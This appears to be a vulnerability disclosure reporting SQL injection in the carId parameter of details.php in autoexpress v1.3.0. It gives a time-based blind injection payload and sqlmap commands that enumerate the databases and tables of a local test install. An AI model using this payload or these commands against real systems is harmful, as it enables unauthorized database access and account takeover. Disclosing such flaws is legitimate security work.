### BUG_Author:

xionggang zhang

### Affected version:

autoexpress

### Vendor:

http://autoexpress.com
http://raymart.com

### Software:

autoexpress - v1.3.0

### Vulnerability File:

details.php

### Description:

The autoexpress system v1.3.0 has an SQL injection vulnerability on the details.php page.
The parameter carId was not processed correctly. Hackers can exploit this vulnerability to manipulate the administrator account of the system and have complete control over the information of other accounts.

Status: Severe

The GET parameter carId has SQL injection

Payload: 

> carId=3 AND (SELECT 2064 From (SELECT (SLEEP (5))) mqMc)

Sqlmap command:

> python sqlmap.py -u http://localhost:8080/autoexpress-Master/details.php?carId=3 --dbs  --batch

![image-20240416105259636](C:\Users\zhangxiongbin\AppData\Roaming\Typora\typora-user-images\image-20240416105259636.png)

![image-20240416105331342](C:\Users\zhangxiongbin\AppData\Roaming\Typora\typora-user-images\image-20240416105331342.png)

> python sqlmap.py -u http://localhost:8080/autoexpress-Master/details.php?carId=3 -D autoexpress --tables  --batch

![image-20240416105627005](C:\Users\zhangxiongbin\AppData\Roaming\Typora\typora-user-images\image-20240416105627005.png)